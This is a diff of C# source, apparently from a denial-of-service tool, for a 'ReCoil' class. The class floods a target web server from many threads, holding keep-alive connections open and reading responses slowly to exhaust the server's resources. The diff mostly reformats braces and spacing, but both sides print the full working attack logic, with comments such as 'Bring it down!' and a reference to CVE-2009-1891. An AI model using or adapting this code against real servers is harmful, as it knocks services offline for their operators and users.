@@ -1,8 +1,8 @@
-﻿using System;
+﻿using GAS.Core.Strings;
+using System;
 using System.Collections.Generic;
 using System.Net.Sockets;
 using System.Threading;
-using GAS.Core.Strings;
 namespace GAS.Core
 {
     /// <summary>
@@ -56,103 +56,89 @@ namespace GAS.Core
         /// <param name="random">adds a random string to the subsite so that every new connection requests a new file. (use on searchsites or to bypass the cache / proxy)</param>
         /// <param name="nSockets">the amount of sockets for this object</param>
         /// <param name="usegZip">turns on the gzip / deflate header to check for: CVE-2009-1891 - keep in mind, that the compressed file still has to be larger than ~24KB! (maybe use on large static files like pdf etc?)</param>
-        public ReCoil(string dns, string ip, int port, string subSite, int delay, int timeout, bool random, bool resp, int nSockets, bool usegZip,int threadcount)
-        {
+        public ReCoil(string dns, string ip, int port, string subSite, int delay, int timeout, bool random, bool resp, int nSockets, bool usegZip, int threadcount) {
             ThreadCount = threadcount;
             this.WorkingThreads = new Thread[ThreadCount];
             this.States = new ReqState[ThreadCount];
             this._lSockets = new List<Socket>[ThreadCount];
-            this._dns = (dns == "") ? ip : dns; //hopefully they know what they are doing :)
+            this._dns = ( dns == "" ) ? ip : dns; //hopefully they know what they are doing :)
             this._ip = ip;
             this._port = port;
             this._subSite = subSite;
             this._nSockets = nSockets;
-            if (timeout <= 0) this.Timeout = 30000; // 30 seconds
+            if ( timeout <= 0 ) this.Timeout = 30000; // 30 seconds
             else this.Timeout = timeout * 1000;
             this.Delay = delay + 1;
             this._random = random;
             this._usegZip = usegZip;
             this._resp = resp;
             IsDelayed = true;
-            for (int i = 0; i < ThreadCount; i++)
-            {
+            for ( int i = 0; i < ThreadCount; i++ ) {
                 States[i] = ReqState.Ready;
                 _lSockets[i] = new List<Socket>();
             }
             Requested = 0; // we reset this! - meaning of this counter changes in this context!
-            DefaultAgent = String.Format("GET {0} HTTP/1.1{1}HOST: {2}{1}User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0){1}Keep-Alive: 300{1}Connection: keep-alive{1}{3}{1}", _subSite, Environment.NewLine, _dns, ((_usegZip) ? ("Accept-Encoding: gzip,deflate" + Environment.NewLine) : ""));
-            RandomAgent = String.Format(RandomAgent, _subSite, "{0}", Environment.NewLine, _dns, ((_usegZip) ? ("Accept-Encoding: gzip,deflate" + Environment.NewLine) : ""));
+            DefaultAgent = String.Format("GET {0} HTTP/1.1{1}HOST: {2}{1}User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0){1}Keep-Alive: 300{1}Connection: keep-alive{1}{3}{1}", _subSite, Environment.NewLine, _dns, ( ( _usegZip ) ? ( "Accept-Encoding: gzip,deflate" + Environment.NewLine ) : "" ));
+            RandomAgent = String.Format(RandomAgent, _subSite, "{0}", Environment.NewLine, _dns, ( ( _usegZip ) ? ( "Accept-Encoding: gzip,deflate" + Environment.NewLine ) : "" ));
         }
-        public override void Start()
-        {
-            if (IsFlooding) Stop();
+        public override void Start() {
+            if ( IsFlooding ) Stop();
             IsFlooding = true;
-            for (int i = 0; i < ThreadCount; (WorkingThreads[i] = new Thread(new ParameterizedThreadStart(bw_DoWork))).Start(i++));
+            for ( int i = 0; i < ThreadCount; ( WorkingThreads[i] = new Thread(new ParameterizedThreadStart(bw_DoWork)) ).Start(i++) ) ;
             init = true;
         }
-        public override void Stop()
-        {
+        public override void Stop() {
             IsFlooding = false;
-            foreach (var x in WorkingThreads)
-              try { x.Abort(); }
-              catch { }
+            foreach ( var x in WorkingThreads )
+                try { x.Abort(); }
+                catch { }
         }
-        private void bw_DoWork(object indexinthreads)
-        {
+        private void bw_DoWork(object indexinthreads) {
 
             #region Wait 4 full init
-            while (!init) Thread.Sleep(100);
-            int MY_INDEX_FOR_WORK = (int) indexinthreads;
+            while ( !init ) Thread.Sleep(100);
+            int MY_INDEX_FOR_WORK = (int)indexinthreads;
             #endregion
             #region Attack
-            try
-            {
+            try {
                 #region Prepare
-                int bsize = 16,mincl = 16384; // set minimal content-length to 16KB
-                byte[] sbuf = System.Text.Encoding.ASCII.GetBytes(DefaultAgent),rbuf = new byte[bsize];
+                int bsize = 16, mincl = 16384; // set minimal content-length to 16KB
+                byte[] sbuf = System.Text.Encoding.ASCII.GetBytes(DefaultAgent), rbuf = new byte[bsize];
                 States[MY_INDEX_FOR_WORK] = ReqState.Ready;
                 var stop = DateTime.Now;
                 string redirect = "";
                 #endregion
-                while (IsFlooding)
-                {
+                while ( IsFlooding ) {
 
                     stop = DateTime.Now.AddMilliseconds(Timeout);
                     States[MY_INDEX_FOR_WORK] = ReqState.Connecting; // SET STATE TO CONNECTING //
                     // forget about slow! .. we have enough saveguards in place!
-                    while (IsDelayed && (DateTime.Now < stop))
-                    {
+                    while ( IsDelayed && ( DateTime.Now < stop ) ) {
                         #region Connect
                         var socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                         socket.ReceiveBufferSize = bsize;
-                        try
-                        {
-                            socket.Connect(((_ip == "") ? _dns : _ip), _port);
+                        try {
+                            socket.Connect(( ( _ip == "" ) ? _dns : _ip ), _port);
                             socket.Blocking = _resp; // beware of shitstorm of 10035 - 10037 errors o.O
-                            if (_random) sbuf = System.Text.Encoding.ASCII.GetBytes(String.Format(RandomAgent, Functions.RandomString()));
+                            if ( _random ) sbuf = System.Text.Encoding.ASCII.GetBytes(String.Format(RandomAgent, Functions.RandomString()));
                             socket.Send(sbuf);
                         }
                         catch { }
                         #endregion
                         #region We connected! Bring it down!
-                        if (socket.Connected)
-                        {
+                        if ( socket.Connected ) {
                             bool keeps = !_resp;
                             #region Response analysis is enabled
-                            if (_resp)
-                            {
+                            if ( _resp ) {
                                 #region Process redirects
-                                do
-                                { // some damn fail checks (and resolving dynamic redirects -.-)
+                                do { // some damn fail checks (and resolving dynamic redirects -.-)
                                     #region On redirect
-                                    if (redirect != "")
-                                    {
+                                    if ( redirect != "" ) {
                                         #region Socket is dead -> let recreate it
-                                        if (!socket.Connected)
-                                        {
+                                        if ( !socket.Connected ) {
                                             socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                                             socket.ReceiveBufferSize = bsize;
-                                            socket.Connect(((_ip == "") ? _dns : _ip), _port);
+                                            socket.Connect(( ( _ip == "" ) ? _dns : _ip ), _port);
                                         }
                                         #endregion
                                         sbuf = System.Text.Encoding.ASCII.GetBytes(DefaultAgent);
@@ -162,35 +148,29 @@ namespace GAS.Core
                                     #endregion
                                     keeps = false;
                                     #region Headers
-                                    try
-                                    {
+                                    try {
                                         #region Download headers
                                         string header = "";
-                                        while (!header.Contains(Environment.NewLine + Environment.NewLine) && (socket.Receive(rbuf) >= bsize))
+                                        while ( !header.Contains(Environment.NewLine + Environment.NewLine) && ( socket.Receive(rbuf) >= bsize ) )
                                             header += System.Text.Encoding.ASCII.GetString(rbuf);
-                                        string[] sp = header.Split(new string[] { Environment.NewLine }, StringSplitOptions.RemoveEmptyEntries),tsp;
+                                        string[] sp = header.Split(new string[] { Environment.NewLine }, StringSplitOptions.RemoveEmptyEntries), tsp;
                                         #endregion
                                         #region Process headers
-                                        for (int i = (sp.Length - 1); i >= 0; i--)
-                                        {
+                                        for ( int i = ( sp.Length - 1 ); i >= 0; i-- ) {
                                             tsp = sp[i].Split(':');
-                                            if ((tsp[0] == "Content-Length") && (tsp.Length >= 2))
-                                            { // checking if the content-length is long enough to work with this!
+                                            if ( ( tsp[0] == "Content-Length" ) && ( tsp.Length >= 2 ) ) { // checking if the content-length is long enough to work with this!
                                                 int sl = 0;
-                                                if (int.TryParse(tsp[1], out sl))
-                                                    if (sl >= mincl)
-                                                    {
+                                                if ( int.TryParse(tsp[1], out sl) )
+                                                    if ( sl >= mincl ) {
                                                         keeps = true;
                                                         i = -1;
                                                     }
                                             }
-                                            else if ((tsp[0] == "Transfer-Encoding") && (tsp.Length >= 2) && (tsp[1].ToLower().Trim() == "chunked"))
-                                            {
+                                            else if ( ( tsp[0] == "Transfer-Encoding" ) && ( tsp.Length >= 2 ) && ( tsp[1].ToLower().Trim() == "chunked" ) ) {
                                                 keeps = true; //well, what doo?
                                                 i = -1;
                                             }
-                                            else if ((tsp[0] == "Location") && (tsp.Length >= 2))
-                                            { // follow the redirect
+                                            else if ( ( tsp[0] == "Location" ) && ( tsp.Length >= 2 ) ) { // follow the redirect
                                                 redirect = tsp[1].Trim();
                                                 i = -1;
                                             }
@@ -200,40 +180,36 @@ namespace GAS.Core
                                     catch { }
                                     #endregion
                                 }
-                                while ((redirect != "") && (DateTime.Now < stop));
+                                while ( ( redirect != "" ) && ( DateTime.Now < stop ) );
                                 #endregion
-                                if (!keeps)
+                                if ( !keeps )
                                     Failed++;
                             }
-#endregion
+                            #endregion
                             #region Do not wait for response
-                            if (keeps)
-                            {
+                            if ( keeps ) {
                                 socket.Blocking = true; // we rely on this in the dl-loop!
                                 _lSockets[MY_INDEX_FOR_WORK].Insert(0, socket);
                                 Requested++;
                             }
                             #endregion
                         }
-#endregion
+                        #endregion
                         #region Some checks
-                        if (_lSockets[MY_INDEX_FOR_WORK].Count >= _nSockets) IsDelayed = false;
-                        else if (Delay > 0) System.Threading.Thread.Sleep(Delay);
+                        if ( _lSockets[MY_INDEX_FOR_WORK].Count >= _nSockets ) IsDelayed = false;
+                        else if ( Delay > 0 ) System.Threading.Thread.Sleep(Delay);
                         #endregion
                     }
                     States[MY_INDEX_FOR_WORK] = ReqState.Downloading;
                     #region keep the sockets alive
-                    for (int i = (_lSockets[MY_INDEX_FOR_WORK].Count - 1); i >= 0; i--)
-                    { 
-                        try
-                        {
+                    for ( int i = ( _lSockets[MY_INDEX_FOR_WORK].Count - 1 ); i >= 0; i-- ) {
+                        try {
                             // here's the downfall: if the server at one point decides to just discard the socket 
                             // and not close / reset the connection we are stuck with a half-closed connection
                             // testing for it doesn't work, because the server than resets the connection in order
                             // to respond to the new request ... so we have to rely on the connection timeout!
                             #region Connect and remove dead
-                            if (!_lSockets[MY_INDEX_FOR_WORK][i].Connected || (_lSockets[MY_INDEX_FOR_WORK][i].Receive(rbuf) < bsize))
-                            {
+                            if ( !_lSockets[MY_INDEX_FOR_WORK][i].Connected || ( _lSockets[MY_INDEX_FOR_WORK][i].Receive(rbuf) < bsize ) ) {
                                 _lSockets[MY_INDEX_FOR_WORK].RemoveAt(i);
                                 Failed++;
                                 Requested--; // the "requested" number in the stats shows the actual open sockets
@@ -241,28 +217,26 @@ namespace GAS.Core
                             #endregion
                             else Downloaded++;
                         }
-                        catch
-                        {
+                        catch {
                             _lSockets[MY_INDEX_FOR_WORK].RemoveAt(i);
                             Failed++;
                             Requested--;
                         }
                     }
-                            #endregion
+                    #endregion
                     #region stats
                     States[MY_INDEX_FOR_WORK] = ReqState.Completed;
-                    IsDelayed = (_lSockets[MY_INDEX_FOR_WORK].Count < _nSockets);
-                    if (!IsDelayed) System.Threading.Thread.Sleep(Timeout);
+                    IsDelayed = ( _lSockets[MY_INDEX_FOR_WORK].Count < _nSockets );
+                    if ( !IsDelayed ) System.Threading.Thread.Sleep(Timeout);
                     #endregion
                 }
             }
             catch { States[MY_INDEX_FOR_WORK] = ReqState.Failed; }
             #endregion
             #region Cleanup
-            finally
-            {
+            finally {
                 IsFlooding = false;// not so sure about the graceful shutdown ... but why not?
-                for (int i = (_lSockets[MY_INDEX_FOR_WORK].Count - 1); i >= 0; i--)
+                for ( int i = ( _lSockets[MY_INDEX_FOR_WORK].Count - 1 ); i >= 0; i-- )
                     try { _lSockets[MY_INDEX_FOR_WORK][i].Close(); }
                     catch { }
                 _lSockets[MY_INDEX_FOR_WORK].Clear();
